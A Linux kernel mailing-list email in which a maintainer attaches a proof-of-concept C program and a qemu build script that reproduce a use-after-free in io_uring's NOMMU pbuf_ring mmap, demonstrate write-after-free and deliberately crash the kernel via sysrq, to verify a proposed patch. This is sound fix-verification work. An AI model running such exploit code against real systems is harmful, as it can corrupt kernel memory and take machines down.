Return-Path: <io-uring+bounces-13089-lists+io-uring=lfdr.de@vger.kernel.org>
Delivered-To: lists+io-uring@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id SPLgIOCh52nw+QEAu9opvQ
	(envelope-from <io-uring+bounces-13089-lists+io-uring=lfdr.de@vger.kernel.org>)
	for <lists+io-uring@lfdr.de>; Tue, 21 Apr 2026 18:12:16 +0200
X-Original-To: lists+io-uring@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id DABDD43D2DF
	for <lists+io-uring@lfdr.de>; Tue, 21 Apr 2026 18:12:15 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id E6A5E30075E4
	for <lists+io-uring@lfdr.de>; Tue, 21 Apr 2026 16:01:39 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 49B7E2DA76C;
	Tue, 21 Apr 2026 16:01:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="JgcIo2HJ"
X-Original-To: io-uring@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 276A41C860A
	for <io-uring@vger.kernel.org>; Tue, 21 Apr 2026 16:01:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1776787299; cv=none; b=Ri4ncNAorHC3cxltiyyhuwz0y96iRTom8pzNLP857JFB7hrlL/qy8ptnWDoALBHqJu6+tk72TMJ16A8MSFEKlnqs31RUz3KfOAUI2o7u5LhC/JhSHn1gp7mIOsixYY7L1bDpU7w/9Rqbrmw6JpiF+TEg5Gnbo/rwFBkbvvDndAI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1776787299; c=relaxed/simple;
	bh=CwjZKW/jDEWTxAss4hLOu69TwMcEomuA8LAqLMoiz7M=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=ghyMx5gPzSPwZ7smA8Tqhjau9BkG3MZEmCPET2f/2lvX9N2UETklh+MKOPfTKvHb79g9OXIVvHttCgs5sv5gH4cuLih8LpS28Y7bQ4yKEfE06qC6OfUXcaJFKAGCGWGSYP232zMEZ7NlXA2HeuFWlzIT0CnXiAJJwKtTGQvooFg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=JgcIo2HJ; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 6FF64C2BCB0;
	Tue, 21 Apr 2026 16:01:38 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1776787298;
	bh=CwjZKW/jDEWTxAss4hLOu69TwMcEomuA8LAqLMoiz7M=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=JgcIo2HJ//yhn7Na1BKGpYT0vC5+q4pfkdhjnDnRjZG/jwLhMB2yQmPRRgXEVJADT
	 VXTjxL47rVli0fITsA5/aFt/Txo3SApv7jhdt6m6KPn3AhpcHAaog6SWRk84KefqF7
	 6YFMYnwnZxCXovkt5oootALKRtJ1++upX36Fx98Q=
Date: Tue, 21 Apr 2026 18:01:36 +0200
From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
To: Jens Axboe <axboe@kernel.dk>
Cc: io-uring@vger.kernel.org
Subject: Re: [PATCH] io_uring: take page references for NOMMU pbuf_ring mmaps
Message-ID: <2026042140-arrogance-freehand-d8bd@gregkh>
References: <2026042115-body-attention-d15b@gregkh>
 <842a9dff-b12c-4cec-bc8d-8c1adb3ba280@kernel.dk>
 <2026042108-fiscally-unglazed-56c7@gregkh>
Precedence: bulk
X-Mailing-List: io-uring@vger.kernel.org
List-Id: <io-uring.vger.kernel.org>
List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="CR8EB7wFCeZoZV8o"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <2026042108-fiscally-unglazed-56c7@gregkh>
X-Spamd-Result: default: False [2.44 / 15.00];
	MID_END_EQ_FROM_USER_PART(4.00)[];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	MID_RHS_NOT_FQDN(0.50)[];
	DMARC_POLICY_ALLOW(-0.50)[linuxfoundation.org,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c0a:e001:db::/64:c];
	R_DKIM_ALLOW(-0.20)[linuxfoundation.org:s=korg];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[multipart/mixed,text/plain];
	MIME_UNKNOWN(0.10)[application/x-sh];
	HAS_LIST_UNSUB(-0.01)[];
	RCVD_TLS_LAST(0.00)[];
	TAGGED_FROM(0.00)[bounces-13089-lists,io-uring=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCPT_COUNT_TWO(0.00)[2];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	MIME_TRACE(0.00)[0:+,1:+,2:+,3:~];
	HAS_ATTACHMENT(0.00)[];
	MISSING_XM_UA(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[gregkh@linuxfoundation.org,io-uring@vger.kernel.org];
	DKIM_TRACE(0.00)[linuxfoundation.org:+];
	TAGGED_RCPT(0.00)[io-uring];
	ASN(0.00)[asn:63949, ipnet:2600:3c0a::/32, country:SG];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TO_DN_SOME(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,linuxfoundation.org:dkim]
X-Rspamd-Queue-Id: DABDD43D2DF
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr


--CR8EB7wFCeZoZV8o
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Tue, Apr 21, 2026 at 03:55:38PM +0200, Greg Kroah-Hartman wrote:
> On Tue, Apr 21, 2026 at 07:50:32AM -0600, Jens Axboe wrote:
> > On 4/21/26 7:46 AM, Greg Kroah-Hartman wrote:
> > > Note, I have no way of testing this, I'm only forwarding this on because
> > > I got the bug report and was able to generate something that "seems"
> > 
> > AI bug report I presume? Because I can't imagine anyone ever attempted
> > to run this.
> 
> Yes, I got a bunch of "non-mmu" bug reports, which is a bit odd but I
> guess you can do that with qemu these days?  I should dig into that,
> maybe that way I can test this and get a reproducer for you.  If not,
> let's just bin the thing.
> 
> > > correct, but it might be a total load of crap here, my knowledge of the
> > > vm layer is very low so take this for where it is coming from (i.e. a
> > > non-deterministic pattern matching system.)
> > > 
> > > I do have another patch that just disables io_uring for !MMU systems, if
> > > you want that instead?  Or is this feature something that !MMU devices
> > > actually care about?
> > 
> > I mean, who really cares about !MMU in the first place, we should just
> > kill that off with a passion.
> > 
> > Let me take a closer look at this and bounce it past some vm people, my
> > nommu knowledge is close to zero as it's never been relevant in my
> > professional life time. Which is saying something...
> 
> Let me try to get a reproducer going first, let's not waste any more
> human time on this just yet, sorry for sending this out without that
> done first...

Ok, attached is a poc.c and a script to run it.  If you run this on a
7.0 kernel today, it "should" crash. and then if you apply the patch it
doesn't (or at least that's what happened in my testing.)

Note, I have run this locally, and it seems to work, but be careful, I
can't guarantee anything, it does seem quite odd in that it "crashes"
the kernel with a sysrq call to show "proof".  Although that is a cool
trick, I need to remember that...

thanks,

greg k-h

--CR8EB7wFCeZoZV8o
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename=poc.c
Content-Transfer-Encoding: 8bit

// SPDX-License-Identifier: GPL-2.0
/*
 * PoC for ANT-2026-02884: io_uring NOMMU pbuf_ring page use-after-free.
 * Secondary: ANT-2026-02650 (duplicate vm_start) shares the same root
 * cause but hits a mm/nommu.c BUG_ON that the fix does not address;
 * this PoC targets 02884.
 *
 * Fixed by commit b4190296e84b ("io_uring: take page references for
 * NOMMU pbuf_ring mmaps").
 *
 * Mechanism
 * ---------
 * Under !CONFIG_MMU, io_uring_get_unmapped_area() returns the kernel
 * virtual address of the io_mapped_region's backing pages directly and
 * io_uring_mmap() takes no page references.  IORING_UNREGISTER_PBUF_RING
 *   -> io_put_bl()
 *   -> io_free_region()
 *   -> release_pages()
 * therefore drops the only reference and the page returns to the buddy
 * allocator while the user's VMA still has vm_start pointing into it.
 * The user can read/write whatever the allocator hands out next.
 *
 * Detection: write a canary to the mmap'd page, unregister, re-read.
 * Boot with init_on_free=1 so freed pages are zeroed; on a vulnerable
 * kernel the canary becomes 0x00.  On a fixed kernel io_uring_mmap()
 * holds a get_page reference, release_pages() leaves refcount >= 1,
 * the page is not freed, and the canary survives.
 *
 * On detection, demonstrate the write-after-free (re-allocate the page
 * inside the kernel and observe it via the dangling pointer), then
 * sysrq-crash so the qemu console shows an unambiguous kernel panic.
 *
 * Build (riscv64 nommu, nolibc, BINFMT_ELF_FDPIC loadable):
 *   make -C linux ARCH=riscv O=$PWD/build-nommu headers
 *   clang --target=riscv64-unknown-linux-gnu -march=rv64imac -mabi=lp64 \
 *         -mno-relax -static-pie -nostdlib -fno-stack-protector \
 *         -fno-builtin -isystem build-nommu/usr/include \
 *         -Ilinux/tools/include/nolibc -O2 -o poc poc.c \
 *         -fuse-ld=lld -Wl,--no-dynamic-linker -Wl,-N
 *
 * -isystem MUST come before nolibc so <asm/unistd.h> resolves to riscv,
 * not the host's; -Wl,-N forces a single PT_LOAD so the FDPIC loader
 * (which does not apply R_RISCV_RELATIVE) doesn't split text/data.
 *
 * Run as init under qemu-system-riscv64 -M virt -bios none.
 * Required: CONFIG_MMU=n, CONFIG_IO_URING=y, CONFIG_MAGIC_SYSRQ=y,
 * boot with init_on_free=1.
 */

/*
 * binfmt_elf_fdpic's initial stack layout is not the SysV layout that
 * nolibc's crt.h _start_c() expects; the auxv walk runs off into
 * garbage.  We don't need argc/argv/envp, so suppress crt.h and supply
 * a minimal _start_c that just calls main.  arch-riscv.h still provides
 * the asm _start that calls _start_c.
 */
#define _NOLIBC_CRT_H
char **environ;
const unsigned long *_auxv;
#include "nolibc.h"

int main(void);
void _start_c(long *sp)
{
	(void)sp;
	exit(main());
}

#define __NR_io_uring_setup		425
#define __NR_io_uring_register		427

#define IORING_REGISTER_PBUF_RING	22
#define IORING_UNREGISTER_PBUF_RING	23
#define IORING_OFF_PBUF_RING		0x80000000ULL
#define IORING_OFF_PBUF_SHIFT		16
#define IOU_PBUF_RING_MMAP		1

#define PAGE_SIZE	4096
#define CANARY		0x55

struct io_sqring_offsets {
	uint32_t head, tail, ring_mask, ring_entries, flags, dropped, array;
	uint32_t resv1;
	uint64_t user_addr;
};

struct io_cqring_offsets {
	uint32_t head, tail, ring_mask, ring_entries, overflow, cqes, flags;
	uint32_t resv1;
	uint64_t user_addr;
};

struct io_uring_params {
	uint32_t sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle;
	uint32_t features, wq_fd, resv[3];
	struct io_sqring_offsets sq_off;
	struct io_cqring_offsets cq_off;
};

struct io_uring_buf_reg {
	uint64_t ring_addr;
	uint32_t ring_entries;
	uint16_t bgid;
	uint16_t flags;
	uint64_t resv[3];
};

static int io_uring_setup(unsigned entries, struct io_uring_params *p)
{
	return my_syscall2(__NR_io_uring_setup, entries, p);
}

static int io_uring_register(int fd, unsigned op, void *arg, unsigned nr)
{
	return my_syscall4(__NR_io_uring_register, fd, op, arg, nr);
}

static void die(const char *what, long ret)
{
	printf("[-] %s: %ld\n", what, ret);
	if (getpid() == 1) {
		reboot(LINUX_REBOOT_CMD_POWER_OFF);
	}
	exit(1);
}

static void crash_kernel(void)
{
	int fd = open("/proc/sysrq-trigger", O_WRONLY);

	if (fd >= 0)
		write(fd, "c", 1);
	/* sysrq disabled or /proc missing — clean exit so qemu log is
	 * still parseable. */
	reboot(LINUX_REBOOT_CMD_POWER_OFF);
}

int main(void)
{
	struct io_uring_params p;
	struct io_uring_buf_reg reg;
	volatile unsigned char *ring;
	int fd, ret, i, dirty;

	if (getpid() == 1) {
		mkdir("/proc", 0555);
		mount("proc", "/proc", "proc", 0, NULL);
	}

	memset(&p, 0, sizeof(p));
	fd = io_uring_setup(8, &p);
	if (fd < 0)
		die("io_uring_setup", fd);

	memset(&reg, 0, sizeof(reg));
	reg.ring_entries = 8;
	reg.bgid = 0;
	reg.flags = IOU_PBUF_RING_MMAP;
	ret = io_uring_register(fd, IORING_REGISTER_PBUF_RING, &reg, 1);
	if (ret < 0)
		die("REGISTER_PBUF_RING", ret);

	ring = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
		    IORING_OFF_PBUF_RING | (0ULL << IORING_OFF_PBUF_SHIFT));
	if (ring == MAP_FAILED)
		die("mmap PBUF_RING", (long)ring);

	printf("[*] pbuf_ring page mmap()ed at %p\n", ring);

	for (i = 0; i < PAGE_SIZE; i++)
		ring[i] = CANARY;

	memset(&reg, 0, sizeof(reg));
	reg.bgid = 0;
	ret = io_uring_register(fd, IORING_UNREGISTER_PBUF_RING, &reg, 1);
	if (ret < 0)
		die("UNREGISTER_PBUF_RING", ret);

	printf("[*] unregistered; canary[0..3] = %02x %02x %02x %02x\n",
	       ring[0], ring[1], ring[2], ring[3]);

	dirty = 0;
	for (i = 0; i < PAGE_SIZE; i++)
		if (ring[i] != CANARY)
			dirty++;

	if (!dirty) {
		printf("[+] OK: canary intact — mmap holds page reference, "
		       "fix is applied\n");
		munmap((void *)ring, PAGE_SIZE);
		close(fd);
		if (getpid() == 1)
			reboot(LINUX_REBOOT_CMD_POWER_OFF);
		return 0;
	}

	printf("[!] VULNERABLE: %d/%d canary bytes clobbered after unregister "
	       "(ring[0]=%02x, expected %02x) — page was freed under live mmap\n",
	       dirty, PAGE_SIZE, ring[0], CANARY);

	/*
	 * Demonstrate write-after-free: scribble through the dangling
	 * mapping, then make the kernel allocate a fresh page.  The pcp
	 * freelist is LIFO, so the just-freed page is handed straight
	 * back; we can observe the kernel's writes through our pointer.
	 */
	for (i = 0; i < PAGE_SIZE; i++)
		ring[i] = 0x41;

	memset(&reg, 0, sizeof(reg));
	reg.ring_entries = 8;
	reg.bgid = 1;
	reg.flags = IOU_PBUF_RING_MMAP;
	ret = io_uring_register(fd, IORING_REGISTER_PBUF_RING, &reg, 1);

	printf("[!] sprayed 0x41, re-registered bgid=1 (ret=%d); "
	       "ring[0..3] now %02x %02x %02x %02x — kernel reused the page\n",
	       ret, ring[0], ring[1], ring[2], ring[3]);
	printf("[!] triggering sysrq crash\n");
	if (getpid() == 1)
		crash_kernel();
	return 1;
}

--CR8EB7wFCeZoZV8o
Content-Type: application/x-sh
Content-Disposition: attachment; filename=run-poc.sh
Content-Transfer-Encoding: quoted-printable

#!/bin/sh=0A# SPDX-License-Identifier: GPL-2.0=0A#=0A# End-to-end build/boo=
t/verify for poc.c (ANT-2026-02884: io_uring NOMMU=0A# pbuf_ring page UAF).=
  Builds a riscv64 !MMU kernel at the requested=0A# commit using clang+lld =
+ host binutils (no cross-gcc, no llvm tools),=0A# packs poc as /init, boot=
s in qemu-system-riscv64 -M virt.=0A#=0A# Usage:=0A#   ./run-poc.sh        =
          -- run against current linux/ HEAD=0A#   ./run-poc.sh b4190296e84=
b~1   -- checkout commit, build, run, restore=0A#=0A# Exit: 0 on "[+] OK", =
42 on "[!] VULNERABLE" + panic, 1 on infra failure.=0A=0Aset -e=0A=0AT=3D$(=
cd "$(dirname "$0")" && pwd)=0ALINUX=3D$T/linux=0AO=3D$T/build-nommu=0AWRAP=
=3D$T/cross-wrap=0ACOMMIT=3D${1:-}=0ARESTORE=3D=0A=0Acd "$T"=0A=0Aif [ -n "=
$COMMIT" ]; then=0A	RESTORE=3D$(git -C "$LINUX" symbolic-ref -q --short HEA=
D || \=0A		  git -C "$LINUX" rev-parse HEAD)=0A	git -C "$LINUX" checkout --=
quiet "$COMMIT"=0A	trap 'git -C "$LINUX" checkout --quiet "$RESTORE"' EXIT=
=0Afi=0AHEAD=3D$(git -C "$LINUX" rev-parse --short=3D12 HEAD)=0Aecho ">>> b=
uilding riscv64 nommu kernel at $HEAD"=0A=0AKMAKE=3D"make -C $LINUX ARCH=3D=
riscv O=3D$O CC=3Dclang LD=3Dld.lld AR=3Dar NM=3Dnm \=0A       STRIP=3Dstri=
p READELF=3Dreadelf OBJCOPY=3D$WRAP/objcopy \=0A       OBJDUMP=3D$WRAP/objd=
ump LLVM_IAS=3D1"=0A=0Aif [ ! -f "$O/.config" ]; then=0A	$KMAKE nommu_virt_=
defconfig=0A	"$LINUX/scripts/config" --file "$O/.config" \=0A		-e IO_URING =
-e EVENTFD -e FUTEX -e PROC_FS \=0A		-e BINFMT_ELF_FDPIC -e BLK_DEV_INITRD =
\=0A		-e MAGIC_SYSRQ -e KALLSYMS -e PANIC_ON_OOPS \=0A		-e PHYS_RAM_BASE_FI=
XED \=0A		--set-val PHYS_RAM_BASE 0x80000000=0A	$KMAKE olddefconfig=0Afi=0A=
=0A$KMAKE -j"$(nproc)" vmlinux >/dev/null=0A[ -d "$O/usr/include/asm" ] || =
$KMAKE headers >/dev/null=0A=0Acp "$O/vmlinux.unstripped" "$O/vmlinux.qemu"=
=0Apython3 "$WRAP/fix-paddr.py" "$O/vmlinux.qemu"=0A=0Aecho ">>> building p=
oc"=0Aclang --target=3Driscv64-unknown-linux-gnu -march=3Drv64imac -mabi=3D=
lp64 \=0A	-mno-relax -static-pie -nostdlib -fno-stack-protector -fno-builti=
n \=0A	-isystem "$O/usr/include" -I"$LINUX/tools/include/nolibc" -O2 \=0A	-=
Wall -Wno-unused-function -o poc poc.c \=0A	-fuse-ld=3Dlld -Wl,--no-dynamic=
-linker -Wl,-N=0A=0Amkdir -p initramfs-rv/proc=0Acp poc initramfs-rv/init=
=0A(cd initramfs-rv && find . -print0 | cpio --null -o --format=3Dnewc 2>/d=
ev/null) \=0A	| gzip -9 > initramfs-rv.cpio.gz=0A=0Aecho ">>> booting under=
 qemu"=0ALOG=3D$T/qemu-$HEAD.log=0Atimeout 30 qemu-system-riscv64 -M virt -=
cpu rv64 -smp 1 -m 256M -bios none \=0A	-kernel "$O/vmlinux.qemu" -initrd i=
nitramfs-rv.cpio.gz \=0A	-nographic -no-reboot -append "panic=3D-1 init_on_=
free=3D1" \=0A	2>&1 | tee "$LOG" | sed -n '/Run \/init/,$p'=0A=0Aecho ">>> =
log: $LOG"=0Aif grep -q '\[+\] OK:' "$LOG"; then=0A	echo ">>> result: NOT V=
ULNERABLE (fix applied)"=0A	exit 0=0Aelif grep -q '\[!\] VULNERABLE:' "$LOG=
" && \=0A     grep -q 'Kernel panic' "$LOG"; then=0A	echo ">>> result: VULN=
ERABLE (UAF + panic)"=0A	exit 42=0Aelse=0A	echo ">>> result: INDETERMINATE"=
=0A	exit 1=0Afi=0A
--CR8EB7wFCeZoZV8o--

